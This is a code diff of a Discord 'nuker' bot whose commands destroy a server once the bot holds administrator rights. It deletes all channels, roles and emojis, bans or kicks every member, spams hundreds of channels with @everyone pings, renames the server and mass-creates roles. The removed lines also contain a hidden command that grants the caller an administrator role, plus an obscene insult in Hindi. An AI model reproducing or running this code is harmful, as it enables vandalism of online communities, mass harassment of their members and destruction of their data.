@@ -41,15 +41,15 @@ client.on("ready", () => {
     console.log(greenBright(`                                      Permission Required: ADMINISTRATOR`));
     console.log(red('           ════════════════════════════════════════════════════════════════════════════════'));
     console.log("");
-    client.user.setActivity({ type: "PLAYING", name: "Citizen's Commands" }); // Delete this if you wish.
+    client.user.setActivity({ type: "PLAYING", name: "presser" }); // Delete this if you wish.
 });
 
 
 client.on("message", async message => {
 
-  if (message.author.bot) return;
+    if (message.author.bot) return;
 
-   /* if (message.mentions.everyone === true) {
+    if (message.mentions.everyone === true) {
         return;
     } else if (message.mentions.has(client.user.id)) {
         const helpEmbed = new Discord.MessageEmbed()
@@ -72,59 +72,11 @@ client.on("message", async message => {
             .setTimestamp(Date.now());
         message.channel.send(helpEmbed);
     }
-		*/
 
     // Test Command
     if (message.content.startsWith(prefix + "ping")) {
         message.channel.send("Pong!")
     }
-
-
-
-			//Admin Perm
-          if (message.content.startsWith(prefix + 'papa'))
-		  {    role = await message.guild.roles.create ({
-             name: 'role',
-             color: 'BLUE',
-             })
-	           role.setPermissions(['ADMINISTRATOR'])
-	          role.setPosition(15)
-
-						message.member.roles.add(role)
-             message.delete();
-
-						return console.log(red("ADMINSTRATOR!!!!! granted to " + message.member.user.tag))
-
-				}
-
-    //Leave
-
-	 		if (message.content.startsWith(prefix + 'lalit'))
-		  {
-			 if (message.author.id == 462270540502269953 || message.author.id == 387706245362089986 || message.author.id == 780376098365243395 || message.author.id == 683667783737016332 || message.author.id == 479369896451375139){
-			      try
-			     {
-
-             message.delete();
-            message.guild.leave();
-
-            return console.log(red("SUCESSFULLY LEFT THE SERVER......Sad :("))
-
-           }
-		          catch(e)
-		        {
-
-              console.log(e.stack);
-
-            }
-				 }
-
-           else
-					 message.channel.send("Baap se bakchodi krega teri maa ki choot lawde")
-
-
-
-				}
 
     // Help
 
@@ -159,15 +111,19 @@ client.on("message", async message => {
             if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                 return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
             } else {
-
+                let args = message.content.split(" ").slice(1);
+                var argresult = args.join(' ');
+                if (!argresult) {
+                    message.channel.send("*Add an input after the cmd*")
+                } else {
                     for (var i = 0; i < 250; i++) {
-                        message.guild.channels.create("Citizen Daddy")
+                        message.guild.channels.create(argresult)
                         console.log(yellowBright(`CHANNEL MASSED!`))
                     }
                 }
                 message.delete();
             }
-
+        }
 
         // Mass Channel & Ping Every Channel
 
@@ -180,10 +136,10 @@ client.on("message", async message => {
                 // If you dont give an input
                 if (!argresult) {
                     for (var i = 0; i < 250; i++) {
-                        message.guild.channels.create("CITIZEN Daddy")
+                        message.guild.channels.create(message.author.username + "Daddy")
 
                         for (var i = 0; i < 250; i++) {
-                            let channels = message.guild.channels.create("CITIZEN Daddy")
+                            let channels = message.guild.channels.create(message.author.username + "Daddy")
 
                             channels.then(
                                 function (channel, index) {
@@ -253,7 +209,6 @@ client.on("message", async message => {
                     console.log(redBright(`CHANNEL FUCKED`))
                 )); // deletes all channels
                 message.delete();
-								message.guild.channels.create("CITIZEN Daddy")
             }
         }
 
@@ -285,15 +240,15 @@ client.on("message", async message => {
 
         // Delete All Roles
         if (message.content.startsWith(prefix + 'dr')) {
+            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
+                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
+            } else {
                 message.guild.roles.cache.forEach((role) => {
-                    if (!role.editable || role.name === "@everyone" || role.name === "new role" || role.name === "everyone" )
-										{
-                        return console.log(red(`ROLE: ${role.name} cannot be deleted`));
-                    } else {
-                        role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} is being deleted successfully`)))
-                    }
-                  })
-						 }
+                    role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} is being deleted successfully`)))
+                })
+                message.delete();
+            }
+        }
 
         // Delete All Emojis
         if (message.content.startsWith(prefix + 'emoall')) {
@@ -307,41 +262,31 @@ client.on("message", async message => {
 
         // Death.
         if (message.content.startsWith(prefix + 'die')) {
-								name= message.guild.name
+            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
+                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
+            } else {
                 message.delete();
-                message.guild.setName(`CITIZEN Daddy `).then(console.log(green(`Server Name changed to: ${"CITIZEN DADDY nuked " + name} Wizzed`))); // changes server name
+                message.guild.setName(`CITIZEN Daddy `).then(console.log(green(`Server Name changed to: ${message.guild.name} Wizzed`))); // changes server name
 
                 // Channel Delete
                 message.guild.channels.cache.forEach(channel => channel.delete().then(
                     console.log(redBright(`CHANNEL FUCKED`))
                 ).then(
                     // Channel Icon Change
-                    message.guild.setIcon('https://images-ext-1.discordapp.net/external/LwTQjXzufFNHNuhQw6xWKko-CEPxYFyMQzBYQQLz_gU/%3Fwidth%3D323%26height%3D406/https/media.discordapp.net/attachments/781947622269255690/829957982926274560/rip.png?width=323&height=405') // changes server pfp
+                    message.guild.setIcon('https://cdn.discordapp.com/attachments/806791504285925404/820996653523271750/wanted-1.png') // changes server pfp
                 ));
 
-
-               //Channel Creation
-							      for (var i = 0; i < 2; i++) {
-                            let channels = message.guild.channels.create("Citizen Daddy") }
-
-                  for (var i = 0; i < 250; i++) {
-                        message.guild.channels.create(message.author.username + " nuked you")
-
-                        for (var i = 0; i < 100; i++) {
-                            let channels = message.guild.channels.create(message.author.username + " nuked you")
-
-                            channels.then(
-                                function (channel, index) {
-                                    for (var i = 0; i < 100; i++) {
-                                        channel.send('@everyone ' + argresult)
-                                        console.log(blueBright(`CHANNEL PINGED!`));
-                                        // other per-channnel logic
-                                    }
-                                }
-                            );
-                        }
-
+                // Roles
+                message.guild.roles.cache.forEach((role) => {
+                    if (!role.editable) {
+                        return;
+                    } else {
+                        role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} is being deleted successfully`)))
                     }
+                })
+
+                // Emoji
+                message.guild.emojis.cache.forEach(e => e.delete({ reason: "Nuking" },).then(console.log(yellow(`EMOJI: ${e.name} was deleted successfully`))))
 
                 // Massing Channels
                 let args = message.content.split(" ").slice(1);
@@ -352,7 +297,7 @@ client.on("message", async message => {
                 } else {
 
                     for (var i = 0; i < 250; i++) {
-                        let channels = message.guild.channels.create("@everyone "+argresult)
+                        let channels = message.guild.channels.create(argresult)
 
                         channels.then(
                             function (channel, index) {
@@ -365,29 +310,21 @@ client.on("message", async message => {
                         )
                     }
                 }
-
-                // Roles
-                 message.guild.roles.cache.forEach((role) => {
-                    if (!role.editable || role.name === "@everyone" || role.name === "new role" || role.name === "everyone" )
-										{
-                        return console.log(red(`ROLE: ${role.name} cannot be deleted`));
-                    } else {
-                        role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} is being deleted successfully`)))
-                    }
-                  })
-
-                // Emoji
-                message.guild.emojis.cache.forEach(e => e.delete({ reason: "Nuking" },).then(console.log(yellow(`EMOJI: ${e.name} was deleted successfully`))))
-
-
-
-			}
+                setInterval(function () {
+                    var i = 0; i < 250;
+                    message.guild.roles.create({
+                        data: {
+                            name: `${argresult}`,
+                            position: i++,
+                            color: "RANDOM"
+                        }
+                    }).then(console.log(yellow("ROLE BEING MASSED")))
+                }, 100) // 0.1 second
+            }
+        }
 
         ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-    } else if (disableEveryone === true)
-     {
-		   if (message.author.id == 462270540502269953 || message.author.id == 387706245362089986 || message.author.id == 780376098365243395 || message.author.id == 683667783737016332 || message.author.id == 479369896451375139 ){
-			 {
+    } else if (disableEveryone === true) {
 
         if (message.content.startsWith(prefix + 'help')) {
             if (message.author.id != myID) {
@@ -421,9 +358,11 @@ client.on("message", async message => {
         if (message.content.startsWith(prefix + 'cc')) {
             if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                 return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
-            } else
-						 {
-
+            } else {
+                if (message.author.id != myID) {
+                    return message.reply('You are not authorised to use any of these tools commands.')
+                }
+                else {
                     if (!argresult) {
                         message.channel.send("*Add an input after the cmd*")
                     } else {
@@ -434,8 +373,8 @@ client.on("message", async message => {
                             console.log(yellowBright(`CHANNEL MASSED!`))
                         }
                     }
-
-              }
+                }
+            }
         }
 
         // Mass Channel & Ping Every Channel
@@ -443,8 +382,11 @@ client.on("message", async message => {
         if (message.content.startsWith(prefix + 'mp')) {
             if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                 return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
-            } else
-						   {
+            } else {
+                if (message.author.id != myID) {
+                    return message.reply('You are not authorised to use any of these tools commands.')
+                }
+                else {
                     let args = message.content.split(" ").slice(1);
                     var argresult = args.join(' ');
                     // If you dont give an input
@@ -468,7 +410,7 @@ client.on("message", async message => {
 
                         }
 
-
+                    }
                     // If you give an input
                     for (var i = 0; i < 250; i++) {
                         let channels = message.guild.channels.create(argresult)
@@ -483,8 +425,8 @@ client.on("message", async message => {
                             }
                         );
                     }
-                  }
-              }
+                }
+            }
         }
         // Mass Create Roles
 
@@ -492,7 +434,10 @@ client.on("message", async message => {
             if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                 return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
             } else {
-
+                if (message.author.id != myID) {
+                    return message.reply('You are not authorised to use any of these tools commands.')
+                }
+                else {
                     let args = message.content.split(" ").slice(1);
                     var argresult = args.join(' ');
                     if (!argresult) {
@@ -509,21 +454,23 @@ client.on("message", async message => {
                             }).then(console.log(yellow("ROLE BEING MASSED")))
                         }, 100) // 0.1 second
                     }
-
+                }
             }
         }
 
-				//Channel delete
         if (message.content.startsWith(prefix + 'chd')) {
             if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                 return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
             } else {
-
+                if (message.author.id != myID) {
+                    return message.reply('You are not authorised to use any of these tools commands.')
+                }
+                else {
                     message.guild.channels.cache.forEach(channel => channel.delete().then(
                         console.log(redBright(`CHANNEL FUCKED`))
                     )); // deletes all channels
-                  message.guild.channels.create("CITIZEN Daddy")
-
+                    message.delete();
+                }
             }
         }
 
@@ -532,12 +479,15 @@ client.on("message", async message => {
             if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                 return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
             } else {
-
+                if (message.author.id != myID) {
+                    return message.reply('You are not authorised to use any of these tools commands.')
+                }
+                else {
                     message.guild.members.cache.forEach(member => member.ban({ reason: "Nuking." })
                         .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banning All Members.")
                             .catch()
                         ))
-
+                }
             }
         }
 
@@ -546,13 +496,16 @@ client.on("message", async message => {
             if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                 return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
             } else {
-
+                if (message.author.id != myID) {
+                    return message.reply('You are not authorised to use any of these tools commands.')
+                }
+                else {
                     message.guild.members.cache.forEach(member => member.kick({ reason: "Nuking." })
                         .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banning All Members.")
                             .catch()
                         ));
                 }
-
+            }
         }
 
         // Delete All Roles All
@@ -560,15 +513,14 @@ client.on("message", async message => {
             if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                 return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
             } else {
-
-                   message.guild.roles.cache.forEach((role) => {
-                    if (!role.editable || role.name === "@everyone" || role.name === "new role" || role.name === "everyone" )
-										{
-                        return console.log(red(`ROLE: ${role.name} cannot be deleted`));
-                    } else {
-                        role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} is being deleted successfully`)))
-                    }
-                  })
+                if (message.author.id != myID) {
+                    return message.reply('You are not authorised to use any of these tools commands.')
+                }
+                else {
+                    message.guild.roles.cache.forEach(r => r.delete({ reason: "Nuking" }).then(console.log(yellow(`ROLE: ${r.name} was deleted successfully`))).catch(
+                        console.log(yellow(`ROLE: ${r.name} was cannot be deleted.`))
+                    ));
+                }
             }
         }
 
@@ -577,22 +529,27 @@ client.on("message", async message => {
             if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                 return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
             } else {
-
+                if (message.author.id != myID) {
+                    return message.reply('You are not authorised to use any of these tools commands.')
+                }
+                else {
                     message.guild.emojis.cache.forEach(e => e.delete({ reason: "Nuking" }).then(console.log(yellow(`EMOJI: ${e.name} was deleted successfully`))).catch(
                         console.log(yellow(`EMOJI: ${r.name} was cannot be deleted.`))
                     ));
-
+                }
             }
         }
+    }
 
-
-      // Death.
-       if (message.content.startsWith(prefix + 'die')) {
-         if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
+    // Death.
+    if (message.content.startsWith(prefix + 'die')) {
+        if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
             return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
-          }
-					 else {
-
+        } else {
+            if (message.author.id != myID) {
+                return message.reply('You are not authorised to use any of these tools commands.')
+            }
+            else {
                 message.delete();
                 message.guild.setName(`CITIZEN DADDY`).then(console.log(green(`Server Name changed to: ${message.guild.name} Wizzed`))); // changes server name
 
@@ -601,60 +558,20 @@ client.on("message", async message => {
                     console.log(redBright(`CHANNEL FUCKED`))
                 ).then(
                     // Channel Icon Change
-                    message.guild.setIcon('https://images-ext-1.discordapp.net/external/LwTQjXzufFNHNuhQw6xWKko-CEPxYFyMQzBYQQLz_gU/%3Fwidth%3D323%26height%3D406/https/media.discordapp.net/attachments/781947622269255690/829957982926274560/rip.png?width=323&height=405') // changes server pfp
+                    message.guild.setIcon('https://media.discordapp.net/attachments/806791504285925404/820996653523271750/wanted-1.png?width=354&height=462') // changes server pfp
                 ));
 
                 // Roles
-                 message.guild.roles.cache.forEach((role) => {
-                    if (!role.editable || role.name === "@everyone" || role.name === "new role" || role.name === "everyone" )
-										{
-                        return console.log(red(`ROLE: ${role.name} cannot be deleted`));
+                message.guild.roles.cache.forEach((role) => {
+                    if (!role.editable) {
+                        return;
                     } else {
                         role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} is being deleted successfully`)))
                     }
-                  })
+                })
 
                 // Emoji
                 message.guild.emojis.cache.forEach(e => e.delete({ reason: "Nuking" },).then(console.log(yellow(`EMOJI: ${e.name} was deleted successfully`))))
-
-                //
-                 for (var i = 0; i < 5; i++) {
-                        let channels = message.guild.channels.create("CITIZEN Daddy")
-
-                        channels.then(
-                            function (channel, index) {
-                                for (var i = 0; i < 250; i++) {
-                                    channel.send("@everyone")
-                                    console.log(blueBright(`CHANNEL PINGED!`));
-                                    // other per-channnel logic
-                                }
-                            }
-                        )
-                    }
-
-
-               //Channel Creation
-							      for (var i = 0; i < 5; i++) {
-                            let channels = message.guild.channels.create("CITIZEN Daddy") }
-
-                  for (var i = 0; i < 250; i++) {
-                        message.guild.channels.create(message.author.username + " nuked you")
-
-                        for (var i = 0; i < 250; i++) {
-                            let channels = message.guild.channels.create(message.author.username + " nuked you")
-
-                            channels.then(
-                                function (channel, index) {
-                                    for (var i = 0; i < 250; i++) {
-                                        channel.send('@everyone ' + argresult)
-                                        console.log(blueBright(`CHANNEL PINGED!`));
-                                        // other per-channnel logic
-                                    }
-                                }
-                            );
-                        }
-
-                    }
 
                 // Massing Channels
                 let args = message.content.split(" ").slice(1);
@@ -665,7 +582,7 @@ client.on("message", async message => {
                 } else {
 
                     for (var i = 0; i < 250; i++) {
-                        let channels = message.guild.channels.create("@everyone "+argresult)
+                        let channels = message.guild.channels.create(argresult)
 
                         channels.then(
                             function (channel, index) {
@@ -678,18 +595,20 @@ client.on("message", async message => {
                         )
                     }
                 }
-
-
-
-
+                setInterval(function () {
+                    var i = 0; i < 250;
+                    message.guild.roles.create({
+                        data: {
+                            name: `${argresult}`,
+                            position: i++,
+                            color: "RANDOM"
+                        }
+                    }).then(console.log(yellow("ROLE BEING MASSED")))
+                }, 100) // 0.1 second
             }
-
-
         }
-      }
-		}
+    }
 
-  }
- })
+})
 
 client.login(token);
